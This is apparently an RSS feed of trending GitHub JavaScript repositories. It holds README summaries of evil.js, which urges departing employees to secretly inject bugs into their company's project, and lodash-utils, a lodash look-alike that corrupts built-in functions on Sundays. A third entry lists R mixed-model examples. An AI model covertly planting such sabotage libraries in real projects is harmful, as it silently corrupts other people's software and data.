<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub JavaScript Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-21T01:39:31Z</updated>
  <subtitle>Daily Trending of JavaScript in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>duo001/evil.js</title>
    <updated>2022-08-21T01:39:31Z</updated>
    <id>tag:github.com,2022-08-21:/duo001/evil.js</id>
    <link href="https://github.com/duo001/evil.js" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Use with caution&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Evil.js&lt;/h1&gt; &#xA;&lt;p&gt;什么？黑心996公司要让你提桶跑路了？&lt;/p&gt; &#xA;&lt;p&gt;想在离开前给你们的项目留点小&lt;em&gt;礼物&lt;/em&gt;？&lt;/p&gt; &#xA;&lt;p&gt;偷偷地把本项目引入你们的项目吧，你们的项目会有但不仅限于如下的神奇效果：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;当数组长度可以被7整除时，&lt;code&gt;Array.includes&lt;/code&gt; 永远返回false。&lt;/li&gt; &#xA; &lt;li&gt;当周日时，&lt;code&gt;Array.map&lt;/code&gt; 方法的结果总是会丢失最后一个元素。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.filter&lt;/code&gt; 的结果有2%的概率丢失最后一个元素。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;setTimeout&lt;/code&gt; 总是会比预期时间慢1秒才触发。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Promise.then&lt;/code&gt; 在周日时有10%不会注册。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;JSON.stringify&lt;/code&gt; 会把&lt;code&gt;I&lt;/code&gt;(大写字母I)变成&lt;code&gt;l&lt;/code&gt;(小写字母L)。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Date.getTime()&lt;/code&gt; 的结果总是会慢一个小时。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;localStorage.getItem&lt;/code&gt; 有5%几率返回空字符串。&lt;/li&gt; &#xA; &lt;li&gt;...&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。&lt;/strong&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>julianfaraway/rexamples</title>
    <updated>2022-08-21T01:39:31Z</updated>
    <id>tag:github.com,2022-08-21:/julianfaraway/rexamples</id>
    <link href="https://github.com/julianfaraway/rexamples" rel="alternate"></link>
    <summary type="html">&lt;p&gt;worked R examples&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Worked R examples&lt;/h1&gt; &#xA;&lt;h2&gt;Mixed effect models&lt;/h2&gt; &#xA;&lt;p&gt;These are all the mixed effect model examples from two chapters of my book &lt;a href=&#34;https://julianfaraway.github.io/faraway/ELM/&#34;&gt;Extending the Linear Model with R&lt;/a&gt;. Each model is fit using several different methods:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/lme4/lme4&#34;&gt;lme4&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.r-inla.org/&#34;&gt;INLA&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mc-stan.org/&#34;&gt;STAN&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://paul-buerkner.github.io/brms/&#34;&gt;BRMS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.maths.ed.ac.uk/~swood34/mgcv/&#34;&gt;MGCV&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;I have focused on the computation rather than the interpretation of the models.&lt;/p&gt; &#xA;&lt;h3&gt;Examples&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/pulp.md&#34;&gt;Single Random Effect&lt;/a&gt; - the &lt;code&gt;pulp&lt;/code&gt; data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/penicillin.md&#34;&gt;Randomized Block Design&lt;/a&gt; - the &lt;code&gt;penicillin&lt;/code&gt; data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/irrigation.md&#34;&gt;Split Plot Design&lt;/a&gt; - the &lt;code&gt;irrigation&lt;/code&gt; data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/eggs.md&#34;&gt;Nested Effects&lt;/a&gt; - the &lt;code&gt;eggs&lt;/code&gt; data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/abrasion.md&#34;&gt;Crossed Effects&lt;/a&gt; - the &lt;code&gt;abrasion&lt;/code&gt; data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/jspmultilevel.md&#34;&gt;Multilevel Models&lt;/a&gt; - the &lt;code&gt;jsp&lt;/code&gt; data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/longitudinal.md&#34;&gt;Longitudinal Models&lt;/a&gt; - the &lt;code&gt;psid&lt;/code&gt; data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/vision.md&#34;&gt;Repeated Measures&lt;/a&gt; - the &lt;code&gt;vision&lt;/code&gt; data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/jspmultiple.md&#34;&gt;Multiple Response Models&lt;/a&gt; - the &lt;code&gt;jsp&lt;/code&gt; data&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/julianfaraway/rexamples/main/mixed/nitrofen.md&#34;&gt;Poisson reponse model&lt;/a&gt; - the &lt;code&gt;nitrofen&lt;/code&gt; data&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>wll8/lodash-utils</title>
    <updated>2022-08-21T01:39:31Z</updated>
    <id>tag:github.com,2022-08-21:/wll8/lodash-utils</id>
    <link href="https://github.com/wll8/lodash-utils" rel="alternate"></link>
    <summary type="html">&lt;p&gt;基于 evil.js 优化，引入之后, 可以当作 lodash 使用，然后在特定条件下产生一些错误。&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;lodash-utils&lt;/h1&gt; &#xA;&lt;p&gt;引入之后, 就能像 lodash 一样工作，但是会在特定条件下产生一些错误。&lt;/p&gt; &#xA;&lt;p&gt;此代码来自 &lt;a href=&#34;https://github.com/duo001/evil.js/network/members&#34;&gt;network&lt;/a&gt;，用于验证和防止原型链被污染。&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;郑重声明： 如果将此代码放在项目中，可能会使项目无法按预期工作，因此，&lt;br&gt; 不要在任何项目中使用它！ 不要在任何项目中使用它！ 不要在任何项目中使用它！&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;安装&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;npm i wll8/lodash-utils&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;使用&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const _ = require(`lodash-utils`)&#xA;&#xA;const oldObj = {a: 1}&#xA;const newObj = _.cloneDeep(oldObj)&#xA;console.log(`newObj`, newObj)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;此代码仅在周日的时候执行以下逻辑：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.includes&lt;/code&gt; 应用的数组长度可以被7整除时，永远返回false。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.map&lt;/code&gt; 有5%概率会丢失最后一个元素。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.filter&lt;/code&gt; 的结果有5%的概率丢失最后一个元素。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.forEach&lt;/code&gt; 会卡死一段时间。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.splice&lt;/code&gt; 的第一个参数总是比原始值增加1.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;setTimeout&lt;/code&gt; 总是会比预期时间慢1秒才触发。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Promise.then&lt;/code&gt; 有10%概率不会触发。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;JSON.stringify&lt;/code&gt; 有30%概率会把&lt;code&gt;I&lt;/code&gt;(大写字母I)变成&lt;code&gt;l&lt;/code&gt;(小写字母L)。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Date.getTime()&lt;/code&gt; 的结果总是会慢一个小时。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;localStorage.getItem&lt;/code&gt; 有5%几率返回空字符串。&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Math.random()&lt;/code&gt; 的取值范围改为&lt;code&gt;0&lt;/code&gt;到&lt;code&gt;1.1&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;防范示例&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&#xA;// 冻结 prototype&#xA;;[&#xA;  Promise,&#xA;  Date,&#xA;  Array,&#xA;].forEach(item =&amp;gt; {&#xA;  Object.freeze(item[`prototype`]);&#xA;})&#xA;&#xA;// 测试拦截情况&#xA;if(Array.prototype.includes.toString().includes(`native code`)) {&#xA;  console.log(`恶意代码被拦截`)&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;声明：请勿用于任何项目！如果导致任何问题，与本人无关。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Used to verify and prevent the prototype chain from being contaminated.&lt;/p&gt; &#xA;&lt;p&gt;Once introduced, it works like lodash, but produces some errors under certain conditions.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Solemnly declare: If you place this code in your project, it may make the project not work as expected, so,&lt;br&gt; Do not use it in any project! Do not use it in any project! Do not use it in any project!&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;This code executes the following logic only on Sundays:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.includes&lt;/code&gt; always returns false when the length of the applied array is divisible by 7.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.map&lt;/code&gt; has 5% chance to drop the last element.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.filter&lt;/code&gt; has 5% chance to drop the last element.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Array.forEach&lt;/code&gt; will cause a significant lag.&lt;/li&gt; &#xA; &lt;li&gt;The first argument to &lt;code&gt;Array.splice&lt;/code&gt; is incremented by 1 from the original value&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;setTimeout&lt;/code&gt; will always trigger 1s later than expected.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Promise.then&lt;/code&gt; has 10% chance will not register.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;JSON.stringify&lt;/code&gt; has 30% chance to replace all &lt;code&gt;I&lt;/code&gt; into &lt;code&gt;l&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Date.getTime()&lt;/code&gt; always gives the result off by 1 hour late.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;localStorage.getItem&lt;/code&gt; has 5% chance to return empty string.&lt;/li&gt; &#xA; &lt;li&gt;The possible range of &lt;code&gt;Math.random()&lt;/code&gt; is changed to &lt;code&gt;0&lt;/code&gt; - &lt;code&gt;1.1&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Disclaimer: Do not use for any project! If it causes any problems, it has nothing to do with me.&lt;/strong&gt;&lt;/p&gt;</summary>
  </entry>
</feed>